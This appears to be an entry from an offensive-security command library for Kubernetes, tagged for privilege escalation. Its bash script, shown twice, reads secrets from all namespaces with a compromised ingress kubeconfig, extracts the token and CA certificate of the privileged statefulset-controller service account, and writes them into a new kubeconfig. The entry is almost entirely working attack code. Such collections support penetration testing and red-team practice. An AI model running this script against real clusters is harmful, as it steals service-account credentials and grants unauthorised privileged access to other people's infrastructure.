---
data: >-
  #!/bin/bash

  server=https://127.0.0.1:36923

  sa=statefulset-controller

  token=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o
  jsonpath="{range
  .items[?(@.metadata.annotations['kubernetes.io/service-account.name']=='$sa')]}{.data.token}{end}"|
  base64 --decode)

  ca=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o
  jsonpath="{range
  .items[?(@.metadata.annotations['kubernetes.io/service-account.name']=='$sa')]}{.data['ca.crt']}{end}")

  cat> sa.kubeconfig <<EOF

  apiVersion: v1

  kind: Config

  clusters:

  - name: default-cluster
    cluster:
     certificate-authority-data: ${ca}
     server: ${server}
  contexts:

  - name: default-context
    context:
     cluster: default-cluster
     namespace: default
     user: default-user
  current-context: default-context

  users:

  - name: default-user
    user:
     token: ${token}
  EOF
tags:
  - kubeconfig
  - escalation
type: command
output: sa.kubeconfig file created
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.865Z'
id: acafbdb2-49d6-4e36-b6d8-28b505d382c5
verified: false
validated: true
submitted: true
---
# bash-generate-sa-kubeconfig

## Command

```bash
#!/bin/bash
server=https://127.0.0.1:36923
sa=statefulset-controller
token=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o jsonpath="{range .items[?(@.metadata.annotations['kubernetes.io/service-account.name']=='$sa')]}{.data.token}{end}"| base64 --decode)
ca=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o jsonpath="{range .items[?(@.metadata.annotations['kubernetes.io/service-account.name']=='$sa')]}{.data['ca.crt']}{end}")
cat> sa.kubeconfig <<EOF
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
   certificate-authority-data: ${ca}
   server: ${server}
contexts:
- name: default-context
  context:
   cluster: default-cluster
   namespace: default
   user: default-user
current-context: default-context
users:
- name: default-user
  user:
   token: ${token}
EOF
```

## Description

Generates a kubeconfig for a specific privileged service account using extracted data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sa` | Service account name | Yes |
| `server` | API server URL | Yes |

## Examples

### Basic Usage

Run with default sa=statefulset-controller.

## Expected Output

sa.kubeconfig file.

## Related

- [[procedures/Extract-Service-Account-Tokens-and-Generate-Kubeconfig]]
